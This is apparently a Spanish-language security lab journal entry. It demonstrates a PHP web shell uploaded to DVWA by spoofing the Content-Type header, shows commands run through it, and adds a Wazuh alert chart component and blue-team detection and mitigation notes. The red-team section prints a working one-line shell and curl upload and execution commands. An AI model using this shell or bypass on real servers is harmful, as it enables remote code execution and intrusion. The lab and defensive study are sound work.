# Día 23 — Web Shells + File Upload Medium + Wazuh Chart

**Fecha:** Abril 2026  
**MITRE:** T1505.003  
**DVWA:** File Upload (Medium)

---

## Teoría

### Web Shells
Una web shell es un script malicioso subido a un servidor web que permite al atacante ejecutar comandos remotamente a través de HTTP. A diferencia de una reverse shell, la web shell es pasiva — espera requests del atacante en lugar de conectarse activamente.

```
Reverse Shell:  Ubuntu → Kali  (conexión saliente)
Web Shell:      Kali → Ubuntu  (request HTTP normal)
```

Ventajas de una web shell sobre una reverse shell:
- No requiere puerto abierto en el firewall
- El tráfico parece HTTP normal — difícil de detectar
- Persiste en el servidor aunque se reinicie

### File Upload Medium
En nivel Low el servidor acepta cualquier archivo sin validación. En nivel Medium verifica el header `Content-Type` del request — solo acepta `image/jpeg` o `image/png`. El problema es que el `Content-Type` es un header HTTP controlado por el cliente — puede ser falsificado.

---

## Red Team

### Sección 1 — Crear la Web Shell

```bash
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php
```

El script PHP toma el parámetro `cmd` de la URL y lo ejecuta en el sistema. El flujo es en dos pasos:

**Paso 1 — Subir el archivo al servidor**
**Paso 2 — Ejecutar comandos via URL:**
```
http://192.168.1.96:8080/hackable/uploads/shell.php?cmd=whoami
```

### Sección 2 — Confirmar el filtro de Medium

```bash
curl -s "http://192.168.1.96:8080/vulnerabilities/upload/" \
  -b "PHPSESSID=<session>; security=medium" \
  -F "uploaded=@/tmp/shell.php;type=application/x-php" \
  -F "Upload=Upload" | grep -i "success\|error\|invalid\|only"
```

**Output:**
```
Your image was not uploaded. We can only accept JPEG or PNG images.
```

Medium verifica el Content-Type — `application/x-php` es rechazado.

### Sección 3 — Bypass: Falsificar Content-Type

```bash
curl -s "http://192.168.1.96:8080/vulnerabilities/upload/" \
  -b "PHPSESSID=<session>; security=medium" \
  -F "uploaded=@/tmp/shell.php;type=image/jpeg" \
  -F "Upload=Upload" | grep -i "success\|hackable"
```

El único cambio es `type=image/jpeg` — el servidor acepta el archivo porque el Content-Type declara que es una imagen.

### Sección 4 — Ejecutar comandos via Web Shell

```bash
# Verificar RCE
curl -s "http://192.168.1.96:8080/hackable/uploads/shell.php?cmd=whoami" \
  -b "PHPSESSID=<session>; security=medium"
# → www-data

# Ver estructura del servidor
curl -s "http://192.168.1.96:8080/hackable/uploads/shell.php?cmd=ls+/var/www/html" \
  -b "PHPSESSID=<session>; security=medium"

# Información del sistema
curl -s "http://192.168.1.96:8080/hackable/uploads/shell.php?cmd=uname+-a" \
  -b "PHPSESSID=<session>; security=medium"
# → Linux 6.17.0-20-generic — Ubuntu x86_64
```

**Resumen File Upload:**

| | Low | Medium |
|--|--|--|
| Filtro | Sin filtro | Verifica Content-Type |
| Bypass | Upload directo | Falsificar `type=image/jpeg` |
| Resultado | RCE | RCE |

**La vulnerabilidad fundamental:** el filtro de Medium confía en el Content-Type que el cliente declara — es un valor controlado por el atacante. La defensa correcta es verificar el contenido real del archivo (magic bytes) en el servidor, no el header que el cliente envía.

---

## App MS Security — Wazuh Chart

Se agregó una gráfica de distribución de alertas Wazuh por nivel de relevancia entre las dos gráficas existentes.

**Nuevo componente WazuhTooltip:**
```jsx
const WazuhTooltip = ({ active, payload, label }) => {
  if (active && payload && payload.length) {
    const color = label === "L10" || label === "L12" ? "#f87171" :
                  label === "L8"  || label === "L9"  ? "#fb923c" : theme.accent
    return (
      <div className="custom-tooltip">
        <span style={{ color }}>{label}</span>
        <span style={{ color: theme.textMuted }}> — </span>
        <span>{payload[0].value} eventos</span>
      </div>
    )
  }
  return null
}
```

**Datos de la gráfica:**
```jsx
const wazuhChartData = [7, 8, 9, 10, 12].map(level => ({
  name: `L${level}`,
  value: wazuhAlerts.filter(a => a.rule_level === level).length
}))
```

**Gráfica:**
```jsx
<div className="chart-section">
  <div className="section-title">Distribución de Alertas Wazuh — Windows-Marco</div>
  <ResponsiveContainer width="100%" height={180}>
    <BarChart data={wazuhChartData} barSize={32}>
      ...
      <Bar dataKey="value" radius={[4, 4, 0, 0]} fill={theme.accent} />
    </BarChart>
  </ResponsiveContainer>
</div>
```

**Resultado observado:**
- L8 — mayor cantidad — `Windows Audit Policy changed` del hardening
- L7 — SessionEnv y eventos de bajo nivel
- L9, L10, L12 — pocos pero visibles

---

## Blue Team

### Detección Web Shell
- Monitorear uploads de archivos con extensiones ejecutables (.php, .asp, .jsp)
- File Integrity Monitoring en el directorio de uploads — Wazuh alertaría sobre nuevos archivos PHP
- Analizar logs de Apache: requests a `/hackable/uploads/*.php` son sospechosos
- Un WAF con reglas de Content-Type detectaría la discrepancia entre extensión y tipo declarado

### Mitigación File Upload
- Verificar magic bytes del archivo en el servidor — no confiar en el Content-Type del cliente
- Renombrar archivos subidos con extensión no ejecutable
- Servir uploads desde un dominio separado sin PHP habilitado
- Limitar tipos de archivo permitidos con whitelist estricta

---

## Conclusión

El filtro de Content-Type en Medium es fácilmente bypasseable porque confía en un valor controlado por el cliente. Cualquier herramienta que permita modificar headers HTTP — curl, Burp Suite, Python requests — puede falsificar el Content-Type y subir código ejecutable. La defensa correcta es validar el contenido real del archivo en el servidor. La gráfica de Wazuh por nivel convierte datos crudos en información visual accionable para el analista — L8 dominante confirma que el hardening del Día 18 sigue generando eventos de auditoría.
